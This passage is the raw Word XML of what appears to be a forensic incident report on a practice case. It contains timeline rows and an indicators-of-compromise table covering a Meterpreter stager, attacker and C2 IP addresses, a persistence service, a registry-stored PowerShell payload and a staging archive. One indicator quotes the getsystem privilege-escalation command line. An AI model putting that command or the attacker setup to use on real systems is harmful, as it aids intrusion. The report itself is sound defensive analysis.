              <w:br/>
              <w:t>/</w:t>
              <w:br/>
              <w:t>http_hostname=194.61.24.102 | http_http_method=GET | http_status=200 | http_http_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19041 | http_http_content_type=text/html | http_length=228 | src_ip=10.42.85.115 | dest_ip=194.61.24.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#153</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:49.936293</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>203.78.103.109</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.115:50875 -&gt; 203.78.103.109:443 failed state=established bytes=280374/1764209</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process scan (psscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, psscan)</w:t>
              <w:br/>
              <w:t>coreupdater.ex</w:t>
              <w:br/>
              <w:t>PID=8324 | PPID=4008 | ImageFileName=coreupdater.ex | SessionId=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.psscan.PsScan.jsonl#167</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Indicators of compromise</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="680"/>
        <w:gridCol w:w="907"/>
        <w:gridCol w:w="2381"/>
        <w:gridCol w:w="2381"/>
        <w:gridCol w:w="1247"/>
        <w:gridCol w:w="1247"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>First seen (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Last seen (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sha256</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>coreupdater.exe (7168 bytes, MD5 eed41b4500e473f97c50c7385ef5e374) downloaded from http://194.61.24.102/coreupdater.exe by 10.42.85.115 and 10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#138</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sha1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>fd153c66386ca93ec9993d66a84d6f0d129a3a5c</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache SHA1 of C:\Windows\System32\coreupdater.exe (Meterpreter stager)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>194.61.24.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Attacker host: RDP to DC, hosting /coreupdater.exe over HTTP port 80</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:21:27.226262</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411351</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#442</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#32</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>203.78.103.109</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Meterpreter C2 on TCP 443 (flows from 10.42.85.115 ports 50875, 50972 and from DC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:50.282950</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:50.282950</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#446</w:t>
              <w:br/>
              <w:t>volatility/windows.netscan.NetScan.jsonl#110</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Malware location, MFT entry 26213; also service 'coreupdater' (auto start, LocalSystem)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#27972</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>nehgye</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Meterpreter getsystem service: cmd.exe /c echo nehgye &gt; \\.\pipe\nehgye</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40867</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>registry</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HKLM\Software\q9Z1bssi\JqxNhWJA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Base64 PowerShell payload executed by HKLM Run 'coreupdate'</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\mortysmith\Documents\loot.zip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Staging archive created by Administrator RDP session 03:46:15-18 (MFT entry 87470, ~131,041 bytes), deleted 03:47:09.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.069334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
              <w:br/>
              <w:t>lecmd/lnk_F.csv#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>md5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>eed41b4500e473f97c50c7385ef5e374</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MD5 of coreupdater.exe (7168 bytes) extracted by Suricata from HTTP http://194.61.24.102/coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#138</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>url</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
